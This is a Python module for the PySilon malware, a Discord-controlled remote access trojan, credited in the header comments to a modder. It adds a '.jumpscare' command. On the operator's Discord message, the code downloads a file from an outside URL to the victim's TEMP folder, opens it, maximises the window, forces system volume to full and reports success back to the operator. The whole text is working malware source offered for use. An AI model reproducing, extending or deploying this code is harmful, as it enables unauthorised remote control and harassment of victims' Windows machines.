#THIS WAS MADE BY @MASTERAUXB ON TWITTER PLEASE DO NOT DELETE 
#ORIGINAL AUTHOR : https://github.com/mategol/PySilon-malware
#MODDED AUTHOR : https://github.com/MaitreAuxb/
#I TOOK TIME TO CREATE THIS PROJECT PLEASE DO NO DELETE THIS

import win32gui
import win32con
import os, requests, time
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
# end of imports

# on message
elif message.content == '.jumpscare':
    await message.delete()
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))

    video_url = "https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg"

    temp_folder = os.environ['TEMP']
    temp_file = os.path.join(temp_folder, 'jumpscare.mp4')

    if not os.path.exists(temp_file):
        response = requests.get(video_url)
        with open(temp_file, 'wb') as file:
            file.write(response.content)

    time.sleep(1)
    os.startfile(temp_file)
    time.sleep(0.6)
    get_video_window = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(get_video_window, win32con.SW_MAXIMIZE)
    volume.SetMasterVolumeLevelScalar(1.0, None)
    embed = discord.Embed(title="🟢 Success",description=f'```Jumpscare has been triggered.```', colour=discord.Colour.green())
    embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
    await message.channel.send(embed=embed)

#THIS WAS MADE BY @MASTERAUXB ON TWITTER PLEASE DO NOT DELETE 
#ORIGINAL AUTHOR : https://github.com/mategol/PySilon-malware
#MODDED AUTHOR : https://github.com/MaitreAuxb/
#I TOOK TIME TO CREATE THIS PROJECT PLEASE DO NO DELETE THIS